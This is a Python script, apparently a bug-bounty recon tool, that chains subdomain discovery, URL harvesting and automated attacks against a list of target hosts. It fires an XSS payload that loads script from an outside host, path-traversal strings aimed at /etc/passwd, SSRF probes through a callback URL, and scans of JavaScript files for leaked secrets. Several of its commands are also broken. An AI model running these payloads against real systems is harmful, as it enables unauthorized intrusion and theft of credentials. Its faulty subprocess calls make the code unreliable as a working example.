import os
import subprocess
import sys
import time

# ANSI color codes for terminal output
BLUE = "\033[0;34m"
RED = "\033[91m"
GREEN = "\033[32m"
END = "\033[0m"

# Banner for the script, displayed at the start
banner = f"""{GREEN}    ______            __                          __  __                   __               
   / ____/  ____ _   / /  _____  ____    ____    / / / /  __  __   ____   / /_  ___    _____
  / /_     / __ `/  / /  / ___/ / __ \  / __ \  / /_/ /  / / / /  / __ \ / __/ / _ \  / ___/
 / __/    / /_/ /  / /  / /__  / /_/ / / / / / / __  /  / /_/ /  / / / // /_  /  __/ / /    
/_/       \__,_/  /_/   \___/  \____/ /_/ /_/ /_/ /_/   \__,_/  /_/ /_/ \__/  \___/ /_/     
                                                            Coder: OctaYus0x01
                                                            https://github.com/octayus
                                                                                            {END}"""
print(banner)


def mk_dir(output) :
    """Create the output directory structure for storing various types of scan results."""
    try :
        print(f"{GREEN}[+] Creating output directory{END}")
        time.sleep(0.2)

        # Create the main output directory
        os.mkdir(output)
        if os.path.isdir(output) :
            # Define subdirectories and create them
            output_dirs = ["hosts", "urls", "vuln"]
            for dirs in output_dirs :
                os.makedirs(os.path.join(output, dirs))

            # Define host-related files and create them
            host_files = ["subs.txt", "httpx.txt", "alive.txt", "asn.txt"]
            hosts_path = os.path.join(output, "hosts")
            for hf in host_files :
                with open(os.path.join(hosts_path, hf), "w") :
                    pass

            # Define URL-related files and create them
            urls = ["all-urls", "params", "js-files", "js-findings", "mantra1"]
            urls_path = os.path.join(output, "urls")
            for u in urls :
                with open(os.path.join(urls_path, f"{u}.txt"), "w") as b :
                    pass

            # Define files for common vulnerabilities and create them
            gf_urls = ["xss", "lfi", "ssrf", "sqli"]
            gf_path = os.path.join(output, "urls")
            for gf_f in gf_urls :
                with open(os.path.join(gf_path, f"gf-{gf_f}.txt"), "w") as b :
                    pass

            # Define files for specific bugs and create them
            common_bugs = ["xss", "lfi", "ssrf", "sqli", "nuclei-o", "subdomain-takeover"]
            bugs_path = os.path.join(output, "vuln")
            for bugs in common_bugs :
                with open(os.path.join(bugs_path, f"{bugs}.txt"), "w") as c :
                    pass

        time.sleep(0.2)
        print(f"{GREEN}[+] Directory successfully created{END}")
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def subdomain(hosts, output) :
    """Collect subdomains using tools like subfinder and amass."""
    time.sleep(0.2)
    print(f"{GREEN}[+] Collecting subdomain for {hosts}{END}")
    try :
        # Run subfinder to collect subdomains and save the output
        subprocess.run(["subfinder", "-dL", hosts, "-o", os.path.join(output, "hosts", "subs.txt")])
        # Run amass to enumerate subdomains and append the results
        subprocess.run(["amass", "enum", "-df", hosts, "anew", f"{output}/hosts/subs.txt"])
        # Run

        # Count the number of collected subdomains
        subs_path = open(f"{output}/hosts/subs.txt")
        subs_count = subs_path.readlines
        print(f"{GREEN}[+] Successfully collected {subs_count} subdomain {END}")
        time.sleep(0.2)
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def probe_subs(output) :
    """Probe for alive subdomains using httpx."""
    try :
        print(f"{GREEN}[+] Probing for alive subdomains{END}")

        # Run httpx to check which subdomains are alive and output results
        subprocess.run(["httpx", "-l", f"{output}/hosts/subs.txt", "-sc", "-title", "-td", "-fr", "-o",
                        os.path.join(output, "hosts", "httpx.txt")])

        # Extract alive subdomains and append to alive.txt
        awk_cmd = '{print $1}'
        subprocess.run(f"cat {output}/hosts/httpx.txt | awk \'{awk_cmd}\' | tee -a {output}/hosts/alive.txt")
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def takeovers(output) :
    """Testing for subdomains takeovers"""
    try :
        print(f"{GREEN}[+] Testing for Subdomains Takeovers{END}")
        subprocess.run(
            ["subzy", "run", "-targets", "string", f"{output}/hosts/subs.txt", "--vuln", "--output", "string",
             f"{output}/vuln/subdomain-takeover.txt"])
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def urls(output, hosts) :
    """Collect URLs and parameters from alive subdomains using tools like waymore and gau."""
    try :
        input_urls = f"{output}/hosts/alive.txt"
        output_urls = f"{output}/urls/all-urls.txt"
        output_params = f"{output}/urls/params.txt"
        print(f"{GREEN}[+] Collecting all urls and parameters{END}")

        # Use waymore to collect URLs and save the output
        subprocess.run(f"waymore -mode U -i {input_urls} -oU {output_urls}")

        # Use waybackurls to gather historical URLs and append to the results
        subprocess.run(f"cat {input_urls} | waybackurls | anew {output_urls}")

        # Use gau (GetAllUrls) to gather URLs and append to the results
        subprocess.run(f"cat {input_urls} | gau --subs | anew {output_urls}")

        # Collecting all params
        subprocess.run(f"cat {output_urls} | grep \"=\" | tee -a {output_params}")
        subprocess.run(["paramspider", "-l", f"{hosts}"])
        subprocess.run(f"cat results/* | anew {output_params}")

        # Filter all urls with gf
        gf_filter = ["xss", "lfi", "ssrf", "sqli"]
        path = [f"{output}/urls/gf-"]
        for gf in gf_filter :
            subprocess.run(f"cat {output_params} | gf {gf} | tee -a {path}{gf}.txt")

    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def xss(output) :
    """Test for XSS vulnerabilities."""
    try :
        output_params_xss = f"{output}/urls/gf-xss.txt"
        output_xss = f"{output}/vuln/xss.txt"
        print(f"{GREEN}[+] Testing for XSS{END}")
        subprocess.run(
            f"cat {output_params_xss} | qsreplace \'\"><script src=\"https://X55.is?1=18722\"></script>\' | freq | grep -iv \'Not Vulnerable\' | tee -a {output_xss}")

    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def lfi(output) :
    """Test for LFI vulnerabilities."""
    try :
        print(f"{GREEN}[+] Testing for LFI")
        lfi_wordlist = ["/etc/passwd", "../../../../../../../../../../../../../../../../etc/passwd%00",
                        "../../../../../../../../../../../../etc/passwd"]
        output_params_lfi = f"{output}/urls/gf-lfi.txt"
        output_lfi = f"{output}/vuln/lfi.txt"
        for lfi in lfi_wordlist :
            subprocess.run([
                f"httpx -l {output_params_lfi} -path {lfi} -threads 300 -random-agent -mc 200 -mr \'root:[x*]:0:0:\' | anew {output_lfi}"])

    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def ssrf(output, ssrf_payload) :
    """Test for SSRF vulnerabilities using a given payload."""
    try :
        print(f"{GREEN}[+] Testing for SSRF{END}")
        output_params_ssrf = f"{output}/urls/gf-ssrf.txt"
        output_ssrf = f"{output}/vuln/ssrf.txt"
        subprocess.run(
            f"cat {output_params_ssrf} | qsreplace \'{ssrf_payload}\' | xargs -I % -P 25 sh -c \'curl -ks \"%\"\" 2>&1\' | grep \"compute.internal\" | anew {output_ssrf}")
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def jsfiles(output) :
    """Digging for JS files leaked secrets"""
    try :
        print(f"{GREEN}[+] Testing for JS secrets{END}")
        output_urls = f"{output}/urls/all-urls.txt"
        java_script_files = f"{output}/urls/js-files.txt"
        extract_mantra_findings = f"{output}/urls/mantra1.txt"
        save_mantra_findings = f"{output}/urls/js-findings.txt"
        nuclei_template_for_js = f"nuclei-templates/http/exposure/"
        subprocess.run(f"cat {output_urls} | grep \"js$\" | anew {java_script_files}")
        subprocess.run(f"cat {java_script_files} | mantra | anew {extract_mantra_findings}")
        subprocess.run(f"cat {extract_mantra_findings} | grep \"[+]\" | anew {save_mantra_findings}")
        subprocess.run(f"cat {java_script_files} | nuclei --dast -t  ")
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def nuclei_scan(output) :
    """Perform a Nuclei scan using templates for detected vulnerabilities."""
    try :
        print(f"{GREEN}[+] Initializing nuclei scan{END}")
        alive_path = f"{output}/hosts/alive.txt"
        alive_path_exists = os.path.isfile(alive_path)
        output_file = f"{output}/vuln/nuclei-o"
        output_urls_1 = f"{output}/urls/gf-"
        output_path = f"{output}/vuln/"
        nuclei_templates = "NucleiTemplates/centTemplates/"
        nuclei_templates_exists = os.path.isdir(nuclei_templates)

        if alive_path_exists and nuclei_templates_exists :
            print(f"{GREEN}[+] Nuclei active scan")
            subprocess.run(["nuclei", "-l", alive_path, "-t", nuclei_templates, "-o", output_file])
            subprocess.run(f"cat {output_file} | nuclei --dast -t {nuclei_templates} | anew {output_file}")
            gf_vuln_output = ["xss", "lfi", "ssrf", "sqli"]
            for gf_1 in gf_vuln_output :
                subprocess.run(
                    f"cat {output_urls_1}{gf_1} | nuclei --dast -t {nuclei_templates} -tags {gf_1}| anew {output_path}/gf-{gf_1}")
    except Exception as e :
        print(f"{RED}Error occurred: {e}{END}")


def main() :
    """Main function to process command-line arguments and execute scanning functions."""
    if len(sys.argv) != 4 :
        print(f"{RED}[+] Usage: %s <hosts-file> <output-directory> <ssrf-sever-or-burpcollab>{END}" % sys.argv[0])
        print(f"{RED}[+] Example: %s example.com example-output http://example.com{END}" % sys.argv[0])
        sys.exit(1)

    hosts = sys.argv[1]  # The file containing the list of hosts
    output = sys.argv[2]  # The output directory to store results
    ssrf_payload = sys.argv[3]  # The SSRF payload

    mk_dir(output)  # Create the directory structure
    subdomain(hosts, output)  # Collect subdomains
    probe_subs(output)  # Probe for alive subdomains
    takeovers(output)  # Test for subdomains takeovers
    urls(output, hosts)  # Collect URLs and parameters
    xss(output)  # Test for XSS vulnerabilities
    lfi(output)  # Test for LFI vulnerabilities
    ssrf(output, ssrf_payload)  # Test for SSRF vulnerabilities
    jsfiles(output)  # Finding Secrets
    nuclei_scan(output)  # Perform Nuclei scan


if __name__ == "__main__" :
    main()  # Execute the main function if this script is run as the main module
